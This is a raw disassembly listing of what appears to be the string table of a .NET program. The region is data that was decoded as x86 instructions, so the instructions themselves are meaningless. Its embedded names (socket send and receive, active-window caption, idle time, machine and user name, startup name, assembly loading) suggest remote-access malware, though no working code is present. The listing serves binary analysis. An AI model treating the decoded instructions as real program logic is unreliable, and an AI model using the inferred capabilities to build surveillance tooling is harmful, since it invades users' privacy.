  409a48:	47                   	inc    %edi
  409a49:	65 6e                	outsb  %gs:(%esi),(%dx)
  409a4b:	65 72 69             	gs jb  0x409ab7
  409a4e:	63 00                	arpl   %eax,(%eax)
  409a50:	53                   	push   %ebx
  409a51:	65 6e                	outsb  %gs:(%esi),(%dx)
  409a53:	64 41                	fs inc %ecx
  409a55:	73 79                	jae    0x409ad0
  409a57:	6e                   	outsb  %ds:(%esi),(%dx)
  409a58:	63 00                	arpl   %eax,(%eax)
  409a5a:	47                   	inc    %edi
  409a5b:	65 74 49             	gs je  0x409aa7
  409a5e:	64 6c                	fs insb (%dx),%es:(%edi)
  409a60:	65 54                	gs push %esp
  409a62:	69 6d 65 41 73 79 6e 	imul   $0x6e797341,0x65(%ebp),%ebp
  409a69:	63 00                	arpl   %eax,(%eax)
  409a6b:	41                   	inc    %ecx
  409a6c:	75 74                	jne    0x409ae2
  409a6e:	68 65 6e 74 69       	push   $0x69746e65
  409a73:	63 61 74             	arpl   %esp,0x74(%ecx)
  409a76:	65 41                	gs inc %ecx
  409a78:	73 79                	jae    0x409af3
  409a7a:	6e                   	outsb  %ds:(%esi),(%dx)
  409a7b:	63 00                	arpl   %eax,(%eax)
  409a7d:	52                   	push   %edx
  409a7e:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  409a82:	76 65                	jbe    0x409ae9
  409a84:	41                   	inc    %ecx
  409a85:	73 79                	jae    0x409b00
  409a87:	6e                   	outsb  %ds:(%esi),(%dx)
  409a88:	63 00                	arpl   %eax,(%eax)
  409a8a:	43                   	inc    %ebx
  409a8b:	6f                   	outsl  %ds:(%esi),(%dx)
  409a8c:	6e                   	outsb  %ds:(%esi),(%dx)
  409a8d:	6e                   	outsb  %ds:(%esi),(%dx)
  409a8e:	65 63 74 53 75       	arpl   %esi,%gs:0x75(%ebx,%edx,2)
  409a93:	62 53 6f             	bound  %edx,0x6f(%ebx)
  409a96:	63 6b 41             	arpl   %ebp,0x41(%ebx)
  409a99:	73 79                	jae    0x409b14
  409a9b:	6e                   	outsb  %ds:(%esi),(%dx)
  409a9c:	63 00                	arpl   %eax,(%eax)
  409a9e:	46                   	inc    %esi
  409a9f:	72 6f                	jb     0x409b10
  409aa1:	6d                   	insl   (%dx),%es:(%edi)
  409aa2:	41                   	inc    %ecx
  409aa3:	73 79                	jae    0x409b1e
  409aa5:	6e                   	outsb  %ds:(%esi),(%dx)
  409aa6:	63 00                	arpl   %eax,(%eax)
  409aa8:	43                   	inc    %ebx
  409aa9:	6f                   	outsl  %ds:(%esi),(%dx)
  409aaa:	6e                   	outsb  %ds:(%esi),(%dx)
  409aab:	6e                   	outsb  %ds:(%esi),(%dx)
  409aac:	65 63 74 41 6e       	arpl   %esi,%gs:0x6e(%ecx,%eax,2)
  409ab1:	64 53                	fs push %ebx
  409ab3:	65 74 75             	gs je  0x409b2b
  409ab6:	70 41                	jo     0x409af9
  409ab8:	73 79                	jae    0x409b33
  409aba:	6e                   	outsb  %ds:(%esi),(%dx)
  409abb:	63 00                	arpl   %eax,(%eax)
  409abd:	43                   	inc    %ebx
  409abe:	6f                   	outsl  %ds:(%esi),(%dx)
  409abf:	6e                   	outsb  %ds:(%esi),(%dx)
  409ac0:	6e                   	outsb  %ds:(%esi),(%dx)
  409ac1:	65 63 74 41 73       	arpl   %esi,%gs:0x73(%ecx,%eax,2)
  409ac6:	79 6e                	jns    0x409b36
  409ac8:	63 00                	arpl   %eax,(%eax)
  409aca:	47                   	inc    %edi
  409acb:	65 74 43             	gs je  0x409b11
  409ace:	61                   	popa
  409acf:	70 74                	jo     0x409b45
  409ad1:	69 6f 6e 4f 66 41 63 	imul   $0x6341664f,0x6e(%edi),%ebp
  409ad8:	74 69                	je     0x409b43
  409ada:	76 65                	jbe    0x409b41
  409adc:	57                   	push   %edi
  409add:	69 6e 64 6f 77 41 73 	imul   $0x7341776f,0x64(%esi),%ebp
  409ae4:	79 6e                	jns    0x409b54
  409ae6:	63 00                	arpl   %eax,(%eax)
  409ae8:	4c                   	dec    %esp
  409ae9:	6f                   	outsl  %ds:(%esi),(%dx)
  409aea:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  409aed:	41                   	inc    %ecx
  409aee:	6c                   	insb   (%dx),%es:(%edi)
  409aef:	6c                   	insb   (%dx),%es:(%edi)
  409af0:	6f                   	outsl  %ds:(%esi),(%dx)
  409af1:	63 00                	arpl   %eax,(%eax)
  409af3:	47                   	inc    %edi
  409af4:	65 74 57             	gs je  0x409b4e
  409af7:	69 6e 64 6f 77 54 68 	imul   $0x6854776f,0x64(%esi),%ebp
  409afe:	72 65                	jb     0x409b65
  409b00:	61                   	popa
  409b01:	64 50                	fs push %eax
  409b03:	72 6f                	jb     0x409b74
  409b05:	63 65 73             	arpl   %esp,0x73(%ebp)
  409b08:	73 49                	jae    0x409b53
  409b0a:	64 00 73 65          	add    %dh,%fs:0x65(%ebx)
  409b0e:	74 53                	je     0x409b63
  409b10:	65 74 49             	gs je  0x409b5c
  409b13:	64 00 47 65          	add    %al,%fs:0x65(%edi)
  409b17:	74 50                	je     0x409b69
  409b19:	72 6f                	jb     0x409b8a
  409b1b:	63 65 73             	arpl   %esp,0x73(%ebp)
  409b1e:	73 42                	jae    0x409b62
  409b20:	79 49                	jns    0x409b6b
  409b22:	64 00 54 68 72       	add    %dl,%fs:0x72(%eax,%ebp,2)
  409b27:	65 61                	gs popa
  409b29:	64 00 4c 6f 61       	add    %cl,%fs:0x61(%edi,%ebp,2)
  409b2e:	64 00 41 64          	add    %al,%fs:0x64(%ecx)
  409b32:	64 00 43 6f          	add    %al,%fs:0x6f(%ebx)
  409b36:	6d                   	insl   (%dx),%es:(%edi)
  409b37:	70 72                	jo     0x409bab
  409b39:	65 73 73             	gs jae 0x409baf
  409b3c:	65 64 00 67 65       	gs add %ah,%fs:0x65(%edi)
  409b41:	74 5f                	je     0x409ba2
  409b43:	43                   	inc    %ebx
  409b44:	6f                   	outsl  %ds:(%esi),(%dx)
  409b45:	6e                   	outsb  %ds:(%esi),(%dx)
  409b46:	6e                   	outsb  %ds:(%esi),(%dx)
  409b47:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  409b4c:	00 41 77             	add    %al,0x77(%ecx)
  409b4f:	61                   	popa
  409b50:	69 74 55 6e 73 61 66 	imul   $0x65666173,0x6e(%ebp,%edx,2),%esi
  409b57:	65 
  409b58:	4f                   	dec    %edi
  409b59:	6e                   	outsb  %ds:(%esi),(%dx)
  409b5a:	43                   	inc    %ebx
  409b5b:	6f                   	outsl  %ds:(%esi),(%dx)
  409b5c:	6d                   	insl   (%dx),%es:(%edi)
  409b5d:	70 6c                	jo     0x409bcb
  409b5f:	65 74 65             	gs je  0x409bc7
  409b62:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  409b66:	74 5f                	je     0x409bc7
  409b68:	49                   	dec    %ecx
  409b69:	73 43                	jae    0x409bae
  409b6b:	6f                   	outsl  %ds:(%esi),(%dx)
  409b6c:	6d                   	insl   (%dx),%es:(%edi)
  409b6d:	70 6c                	jo     0x409bdb
  409b6f:	65 74 65             	gs je  0x409bd7
  409b72:	64 00 72 65          	add    %dh,%fs:0x65(%edx)
  409b76:	74 69                	je     0x409be1
  409b78:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  409b7c:	61                   	popa
  409b7d:	64 54                	fs push %esp
  409b7f:	6f                   	outsl  %ds:(%esi),(%dx)
  409b80:	45                   	inc    %ebp
  409b81:	6e                   	outsb  %ds:(%esi),(%dx)
  409b82:	64 00 68 57          	add    %ch,%fs:0x57(%eax)
  409b86:	6e                   	outsb  %ds:(%esi),(%dx)
  409b87:	64 00 41 70          	add    %al,%fs:0x70(%ecx)
  409b8b:	70 65                	jo     0x409bf2
  409b8d:	6e                   	outsb  %ds:(%esi),(%dx)
  409b8e:	64 00 47 65          	add    %al,%fs:0x65(%edi)
  409b92:	74 4d                	je     0x409be1
  409b94:	65 74 68             	gs je  0x409bff
  409b97:	6f                   	outsl  %ds:(%esi),(%dx)
  409b98:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  409b9c:	70 6c                	jo     0x409c0a
  409b9e:	61                   	popa
  409b9f:	63 65 00             	arpl   %esp,0x0(%ebp)
  409ba2:	67 65 74 5f          	addr16 gs je 0x409c05
  409ba6:	53                   	push   %ebx
  409ba7:	74 61                	je     0x409c0a
  409ba9:	63 6b 54             	arpl   %ebp,0x54(%ebx)
  409bac:	72 61                	jb     0x409c0f
  409bae:	63 65 00             	arpl   %esp,0x0(%ebp)
  409bb1:	43                   	inc    %ebx
  409bb2:	72 65                	jb     0x409c19
  409bb4:	61                   	popa
  409bb5:	74 65                	je     0x409c1c
  409bb7:	49                   	dec    %ecx
  409bb8:	6e                   	outsb  %ds:(%esi),(%dx)
  409bb9:	73 74                	jae    0x409c2f
  409bbb:	61                   	popa
  409bbc:	6e                   	outsb  %ds:(%esi),(%dx)
  409bbd:	63 65 00             	arpl   %esp,0x0(%ebp)
  409bc0:	43                   	inc    %ebx
  409bc1:	72 79                	jb     0x409c3c
  409bc3:	70 74                	jo     0x409c39
  409bc5:	6f                   	outsl  %ds:(%esi),(%dx)
  409bc6:	53                   	push   %ebx
  409bc7:	74 72                	je     0x409c3b
  409bc9:	65 61                	gs popa
  409bcb:	6d                   	insl   (%dx),%es:(%edi)
  409bcc:	4d                   	dec    %ebp
  409bcd:	6f                   	outsl  %ds:(%esi),(%dx)
  409bce:	64 65 00 41 64       	fs add %al,%gs:0x64(%ecx)
  409bd3:	64 53                	fs push %ebx
  409bd5:	75 62                	jne    0x409c39
  409bd7:	4e                   	dec    %esi
  409bd8:	6f                   	outsl  %ds:(%esi),(%dx)
  409bd9:	64 65 00 73 75       	fs add %dh,%gs:0x75(%ebx)
  409bde:	62 4e 6f             	bound  %ecx,0x6f(%esi)
  409be1:	64 65 00 4d 61       	fs add %cl,%gs:0x61(%ebp)
  409be6:	69 6e 4e 6f 64 65 00 	imul   $0x65646f,0x4e(%esi),%ebp
  409bed:	6e                   	outsb  %ds:(%esi),(%dx)
  409bee:	6f                   	outsl  %ds:(%esi),(%dx)
  409bef:	64 65 00 4c 6f 63    	fs add %cl,%gs:0x63(%edi,%ebp,2)
  409bf5:	61                   	popa
  409bf6:	6c                   	insb   (%dx),%es:(%edi)
  409bf7:	46                   	inc    %esi
  409bf8:	72 65                	jb     0x409c5f
  409bfa:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  409bfe:	74 5f                	je     0x409c5f
  409c00:	4d                   	dec    %ebp
  409c01:	65 73 73             	gs jae 0x409c77
  409c04:	61                   	popa
  409c05:	67 65 00 49 6e       	add    %cl,%gs:0x6e(%bx,%di)
  409c0a:	76 6f                	jbe    0x409c7b
  409c0c:	6b 65 00 67          	imul   $0x67,0x0(%ebp),%esp
  409c10:	65 74 5f             	gs je  0x409c72
  409c13:	41                   	inc    %ecx
  409c14:	76 61                	jbe    0x409c77
  409c16:	69 6c 61 62 6c 65 00 	imul   $0x4500656c,0x62(%ecx,%eiz,2),%ebp
  409c1d:	45 
  409c1e:	6e                   	outsb  %ds:(%esi),(%dx)
  409c1f:	75 6d                	jne    0x409c8e
  409c21:	65 72 61             	gs jb  0x409c85
  409c24:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  409c28:	49                   	dec    %ecx
  409c29:	44                   	inc    %esp
  409c2a:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  409c31:	6c                   	insb   (%dx),%es:(%edi)
  409c32:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  409c36:	6e                   	outsb  %ds:(%esi),(%dx)
  409c37:	74 69                	je     0x409ca2
  409c39:	6d                   	insl   (%dx),%es:(%edi)
  409c3a:	65 46                	gs inc %esi
  409c3c:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  409c43:	64 6c                	fs insb (%dx),%es:(%edi)
  409c45:	65 00 43 6c          	add    %al,%gs:0x6c(%ebx)
  409c49:	6f                   	outsl  %ds:(%esi),(%dx)
  409c4a:	73 65                	jae    0x409cb1
  409c4c:	48                   	dec    %eax
  409c4d:	61                   	popa
  409c4e:	6e                   	outsb  %ds:(%esi),(%dx)
  409c4f:	64 6c                	fs insb (%dx),%es:(%edi)
  409c51:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  409c55:	6c                   	insb   (%dx),%es:(%edi)
  409c56:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  409c5a:	6e                   	outsb  %ds:(%esi),(%dx)
  409c5b:	73 6f                	jae    0x409ccc
  409c5d:	6c                   	insb   (%dx),%es:(%edi)
  409c5e:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  409c62:	74 5f                	je     0x409cc3
  409c64:	57                   	push   %edi
  409c65:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  409c6c:	79 6c                	jns    0x409cda
  409c6e:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  409c72:	6f                   	outsl  %ds:(%esi),(%dx)
  409c73:	63 65 73             	arpl   %esp,0x73(%ebp)
  409c76:	73 57                	jae    0x409ccf
  409c78:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  409c7f:	79 6c                	jns    0x409ced
  409c81:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  409c85:	74 5f                	je     0x409ce6
  409c87:	4e                   	dec    %esi
  409c88:	61                   	popa
  409c89:	6d                   	insl   (%dx),%es:(%edi)
  409c8a:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  409c8e:	74 5f                	je     0x409cef
  409c90:	46                   	inc    %esi
  409c91:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  409c98:	00 
  409c99:	47                   	inc    %edi
  409c9a:	65 74 54             	gs je  0x409cf1
  409c9d:	65 6d                	gs insl (%dx),%es:(%edi)
  409c9f:	70 46                	jo     0x409ce7
  409ca1:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  409ca8:	00 
  409ca9:	47                   	inc    %edi
  409caa:	65 74 46             	gs je  0x409cf3
  409cad:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  409cb4:	00 
  409cb5:	67 65 74 5f          	addr16 gs je 0x409d18
  409cb9:	4d                   	dec    %ebp
  409cba:	61                   	popa
  409cbb:	63 68 69             	arpl   %ebp,0x69(%eax)
  409cbe:	6e                   	outsb  %ds:(%esi),(%dx)
  409cbf:	65 4e                	gs dec %esi
  409cc1:	61                   	popa
  409cc2:	6d                   	insl   (%dx),%es:(%edi)
  409cc3:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  409cc7:	74 5f                	je     0x409d28
  409cc9:	55                   	push   %ebp
  409cca:	73 65                	jae    0x409d31
  409ccc:	72 4e                	jb     0x409d1c
  409cce:	61                   	popa
  409ccf:	6d                   	insl   (%dx),%es:(%edi)
  409cd0:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  409cd4:	74 5f                	je     0x409d35
  409cd6:	50                   	push   %eax
  409cd7:	72 6f                	jb     0x409d48
  409cd9:	63 65 73             	arpl   %esp,0x73(%ebp)
  409cdc:	73 4e                	jae    0x409d2c
  409cde:	61                   	popa
  409cdf:	6d                   	insl   (%dx),%es:(%edi)
  409ce0:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  409ce4:	73 65                	jae    0x409d4b
  409ce6:	6d                   	insl   (%dx),%es:(%edi)
  409ce7:	62 6c 79 4e          	bound  %ebp,0x4e(%ecx,%edi,2)
  409ceb:	61                   	popa
  409cec:	6d                   	insl   (%dx),%es:(%edi)
  409ced:	65 00 73 74          	add    %dh,%gs:0x74(%ebx)
  409cf1:	61                   	popa
  409cf2:	72 74                	jb     0x409d68
  409cf4:	75 70                	jne    0x409d66
  409cf6:	5f                   	pop    %edi
  409cf7:	6e                   	outsb  %ds:(%esi),(%dx)
  409cf8:	61                   	popa
  409cf9:	6d                   	insl   (%dx),%es:(%edi)
  409cfa:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  409cfe:	74 49                	je     0x409d49
  409d00:	64 6c                	fs insb (%dx),%es:(%edi)
  409d02:	65 54                	gs push %esp
  409d04:	69 6d 65 00 44 61 74 	imul   $0x74614400,0x65(%ebp),%ebp
  409d0b:	65 54                	gs push %esp
  409d0d:	69 6d 65 00 64 77 54 	imul   $0x54776400,0x65(%ebp),%ebp
  409d14:	69 6d 65 00 41 70 70 	imul   $0x70704100,0x65(%ebp),%ebp
  409d1b:	65 6e                	outsb  %gs:(%esi),(%dx)
  409d1d:	64 4c                	fs dec %esp
  409d1f:	69 6e 65 00 57 72 69 	imul   $0x69725700,0x65(%esi),%ebp
  409d26:	74 65                	je     0x409d8d
  409d28:	4c                   	dec    %esp
  409d29:	69 6e 65 00 67 65 74 	imul   $0x74656700,0x65(%esi),%ebp
  409d30:	5f                   	pop    %edi
  409d31:	4e                   	dec    %esi
  409d32:	65 77 4c             	gs ja  0x409d81
  409d35:	69 6e 65 00 49 41 73 	imul   $0x73414900,0x65(%esi),%ebp
  409d3c:	79 6e                	jns    0x409dac
  409d3e:	63 53 74             	arpl   %edx,0x74(%ebx)
  409d41:	61                   	popa
  409d42:	74 65                	je     0x409da9
  409d44:	4d                   	dec    %ebp
  409d45:	61                   	popa
  409d46:	63 68 69             	arpl   %ebp,0x69(%eax)
  409d49:	6e                   	outsb  %ds:(%esi),(%dx)
  409d4a:	65 00 53 65          	add    %dl,%gs:0x65(%ebx)
  409d4e:	74 53                	je     0x409da3
  409d50:	74 61                	je     0x409db3
  409d52:	74 65                	je     0x409db9
  409d54:	4d                   	dec    %ebp
  409d55:	61                   	popa
  409d56:	63 68 69             	arpl   %ebp,0x69(%eax)
  409d59:	6e                   	outsb  %ds:(%esi),(%dx)
  409d5a:	65 00 73 74          	add    %dh,%gs:0x74(%ebx)
  409d5e:	61                   	popa
  409d5f:	74 65                	je     0x409dc6
  409d61:	4d                   	dec    %ebp
  409d62:	61                   	popa
  409d63:	63 68 69             	arpl   %ebp,0x69(%eax)
  409d66:	6e                   	outsb  %ds:(%esi),(%dx)
  409d67:	65 00 56 61          	add    %dl,%gs:0x61(%esi)
  409d6b:	6c                   	insb   (%dx),%es:(%edi)
  409d6c:	75 65                	jne    0x409dd3
  409d6e:	54                   	push   %esp
  409d6f:	79 70                	jns    0x409de1
  409d71:	65 00 53 6f          	add    %dl,%gs:0x6f(%ebx)
  409d75:	63 6b 54             	arpl   %ebp,0x54(%ebx)
  409d78:	79 70                	jns    0x409dea
  409d7a:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  409d7e:	6f                   	outsl  %ds:(%esi),(%dx)
  409d7f:	74 6f                	je     0x409df0
  409d81:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  409d84:	54                   	push   %esp
  409d85:	79 70                	jns    0x409df7
  409d87:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  409d8b:	74 54                	je     0x409de1
  409d8d:	79 70                	jns    0x409dff
  409d8f:	65 00 53 6f          	add    %dl,%gs:0x6f(%ebx)
  409d93:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  409d96:	74 54                	je     0x409dec
  409d98:	79 70                	jns    0x409e0a
  409d9a:	65 00 74 79 70       	add    %dh,%gs:0x70(%ecx,%edi,2)
  409d9f:	65 00 42 79          	add    %al,%gs:0x79(%edx)
  409da3:	74 65                	je     0x409e0a
  409da5:	41                   	inc    %ecx
  409da6:	72 72                	jb     0x409e1a
  409da8:	61                   	popa
  409da9:	79 43                	jns    0x409dee
  409dab:	6f                   	outsl  %ds:(%esi),(%dx)
  409dac:	6d                   	insl   (%dx),%es:(%edi)
  409dad:	70 61                	jo     0x409e10
  409daf:	72 65                	jb     0x409e16
  409db1:	00 53 79             	add    %dl,0x79(%ebx)
  409db4:	73 74                	jae    0x409e2a
  409db6:	65 6d                	gs insl (%dx),%es:(%edi)
  409db8:	2e 43                	cs inc %ebx
  409dba:	6f                   	outsl  %ds:(%esi),(%dx)
  409dbb:	72 65                	jb     0x409e22
  409dbd:	00 4d 65             	add    %cl,0x65(%ebp)
  409dc0:	74 68                	je     0x409e2a
  409dc2:	6f                   	outsl  %ds:(%esi),(%dx)
  409dc3:	64 42                	fs inc %edx
  409dc5:	61                   	popa
  409dc6:	73 65                	jae    0x409e2d
  409dc8:	00 43 6c             	add    %al,0x6c(%ebx)
  409dcb:	6f                   	outsl  %ds:(%esi),(%dx)
  409dcc:	73 65                	jae    0x409e33
  409dce:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  409dd2:	70 6f                	jo     0x409e43
  409dd4:	73 65                	jae    0x409e3b
  409dd6:	00 42 54             	add    %al,0x54(%edx)
  409dd9:	72 75                	jb     0x409e50
  409ddb:	6e                   	outsb  %ds:(%esi),(%dx)
  409ddc:	63 61 74             	arpl   %esp,0x74(%ecx)
  409ddf:	65 00 43 72          	add    %al,%gs:0x72(%ebx)
  409de3:	65 61                	gs popa
  409de5:	74 65                	je     0x409e4c
  409de7:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  409dea:	31 5f 5f             	xor    %ebx,0x5f(%edi)
  409ded:	73 74                	jae    0x409e63
  409def:	61                   	popa
  409df0:	74 65                	je     0x409e57
  409df2:	00 44 65 6c          	add    %al,0x6c(%ebp,%eiz,2)
  409df6:	65 74 65             	gs je  0x409e5e
  409df9:	00 57 72             	add    %dl,0x72(%edi)
  409dfc:	69 74 65 00 43 6f 6d 	imul   $0x706d6f43,0x0(%ebp,%eiz,2),%esi
  409e03:	70 
  409e04:	69 6c 65 72 47 65 6e 	imul   $0x656e6547,0x72(%ebp,%eiz,2),%ebp
  409e0b:	65 
  409e0c:	72 61                	jb     0x409e6f
  409e0e:	74 65                	je     0x409e75
  409e10:	64 41                	fs inc %ecx
  409e12:	74 74                	je     0x409e88
  409e14:	72 69                	jb     0x409e7f
  409e16:	62 75 74             	bound  %esi,0x74(%ebp)
  409e19:	65 00 47 75          	add    %al,%gs:0x75(%edi)
  409e1d:	69 64 41 74 74 72 69 	imul   $0x62697274,0x74(%ecx,%eax,2),%esp
  409e24:	62 
  409e25:	75 74                	jne    0x409e9b
  409e27:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  409e2c:	75 67                	jne    0x409e95
  409e2e:	67 61                	addr16 popa
  409e30:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  409e34:	74 74                	je     0x409eaa
  409e36:	72 69                	jb     0x409ea1
  409e38:	62 75 74             	bound  %esi,0x74(%ebp)
  409e3b:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  409e3f:	6d                   	insl   (%dx),%es:(%edi)
  409e40:	56                   	push   %esi
  409e41:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  409e48:	74 74                	je     0x409ebe
  409e4a:	72 69                	jb     0x409eb5
  409e4c:	62 75 74             	bound  %esi,0x74(%ebp)
  409e4f:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  409e53:	73 65                	jae    0x409eba
  409e55:	6d                   	insl   (%dx),%es:(%edi)
  409e56:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  409e5a:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  409e61:	72 
  409e62:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  409e69:	73 79                	jae    0x409ee4
  409e6b:	6e                   	outsb  %ds:(%esi),(%dx)
  409e6c:	63 53 74             	arpl   %edx,0x74(%ebx)
  409e6f:	61                   	popa
  409e70:	74 65                	je     0x409ed7
  409e72:	4d                   	dec    %ebp
  409e73:	61                   	popa
  409e74:	63 68 69             	arpl   %ebp,0x69(%eax)
  409e77:	6e                   	outsb  %ds:(%esi),(%dx)
  409e78:	65 41                	gs inc %ecx
  409e7a:	74 74                	je     0x409ef0
  409e7c:	72 69                	jb     0x409ee7
  409e7e:	62 75 74             	bound  %esi,0x74(%ebp)
  409e81:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  409e85:	73 65                	jae    0x409eec
  409e87:	6d                   	insl   (%dx),%es:(%edi)
  409e88:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  409e8c:	72 61                	jb     0x409eef
  409e8e:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  409e91:	61                   	popa
  409e92:	72 6b                	jb     0x409eff
  409e94:	41                   	inc    %ecx
  409e95:	74 74                	je     0x409f0b
  409e97:	72 69                	jb     0x409f02
  409e99:	62 75 74             	bound  %esi,0x74(%ebp)
  409e9c:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  409ea1:	67 65 74 46          	addr16 gs je 0x409eeb
  409ea5:	72 61                	jb     0x409f08
  409ea7:	6d                   	insl   (%dx),%es:(%edi)
  409ea8:	65 77 6f             	gs ja  0x409f1a
  409eab:	72 6b                	jb     0x409f18
  409ead:	41                   	inc    %ecx
  409eae:	74 74                	je     0x409f24
  409eb0:	72 69                	jb     0x409f1b
  409eb2:	62 75 74             	bound  %esi,0x74(%ebp)
  409eb5:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  409eba:	75 67                	jne    0x409f23
  409ebc:	67 65 72 48          	addr16 gs jb 0x409f08
  409ec0:	69 64 64 65 6e 41 74 	imul   $0x7474416e,0x65(%esp,%eiz,2),%esp
  409ec7:	74 
  409ec8:	72 69                	jb     0x409f33
  409eca:	62 75 74             	bound  %esi,0x74(%ebp)
  409ecd:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  409ed1:	73 65                	jae    0x409f38
  409ed3:	6d                   	insl   (%dx),%es:(%edi)
  409ed4:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  409ed8:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  409edf:	69 
  409ee0:	6f                   	outsl  %ds:(%esi),(%dx)
  409ee1:	6e                   	outsb  %ds:(%esi),(%dx)
  409ee2:	41                   	inc    %ecx
  409ee3:	74 74                	je     0x409f59
  409ee5:	72 69                	jb     0x409f50
  409ee7:	62 75 74             	bound  %esi,0x74(%ebp)
  409eea:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  409eee:	73 65                	jae    0x409f55
  409ef0:	6d                   	insl   (%dx),%es:(%edi)
  409ef1:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  409ef5:	6f                   	outsl  %ds:(%esi),(%dx)
  409ef6:	6e                   	outsb  %ds:(%esi),(%dx)
  409ef7:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  409efd:	74 69                	je     0x409f68
  409eff:	6f                   	outsl  %ds:(%esi),(%dx)
  409f00:	6e                   	outsb  %ds:(%esi),(%dx)
  409f01:	41                   	inc    %ecx
  409f02:	74 74                	je     0x409f78
  409f04:	72 69                	jb     0x409f6f
  409f06:	62 75 74             	bound  %esi,0x74(%ebp)
  409f09:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  409f0d:	73 65                	jae    0x409f74
  409f0f:	6d                   	insl   (%dx),%es:(%edi)
  409f10:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  409f14:	65 73 63             	gs jae 0x409f7a
  409f17:	72 69                	jb     0x409f82
  409f19:	70 74                	jo     0x409f8f
  409f1b:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  409f22:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
  409f29:	6f                   	outsl  %ds:(%esi),(%dx)
  409f2a:	6d                   	insl   (%dx),%es:(%edi)
  409f2b:	70 69                	jo     0x409f96
  409f2d:	6c                   	insb   (%dx),%es:(%edi)
  409f2e:	61                   	popa
  409f2f:	74 69                	je     0x409f9a
  409f31:	6f                   	outsl  %ds:(%esi),(%dx)
  409f32:	6e                   	outsb  %ds:(%esi),(%dx)
  409f33:	52                   	push   %edx
  409f34:	65 6c                	gs insb (%dx),%es:(%edi)
  409f36:	61                   	popa
  409f37:	78 61                	js     0x409f9a
  409f39:	74 69                	je     0x409fa4
  409f3b:	6f                   	outsl  %ds:(%esi),(%dx)
  409f3c:	6e                   	outsb  %ds:(%esi),(%dx)
  409f3d:	73 41                	jae    0x409f80
  409f3f:	74 74                	je     0x409fb5
  409f41:	72 69                	jb     0x409fac
  409f43:	62 75 74             	bound  %esi,0x74(%ebp)
  409f46:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  409f4a:	73 65                	jae    0x409fb1
  409f4c:	6d                   	insl   (%dx),%es:(%edi)
  409f4d:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  409f51:	72 6f                	jb     0x409fc2
  409f53:	64 75 63             	fs jne 0x409fb9
  409f56:	74 41                	je     0x409f99
  409f58:	74 74                	je     0x409fce
  409f5a:	72 69                	jb     0x409fc5
  409f5c:	62 75 74             	bound  %esi,0x74(%ebp)
  409f5f:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  409f63:	73 65                	jae    0x409fca
  409f65:	6d                   	insl   (%dx),%es:(%edi)
  409f66:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  409f6a:	6f                   	outsl  %ds:(%esi),(%dx)
  409f6b:	70 79                	jo     0x409fe6
  409f6d:	72 69                	jb     0x409fd8
  409f6f:	67 68 74 41 74 74    	addr16 push $0x74744174
  409f75:	72 69                	jb     0x409fe0
  409f77:	62 75 74             	bound  %esi,0x74(%ebp)
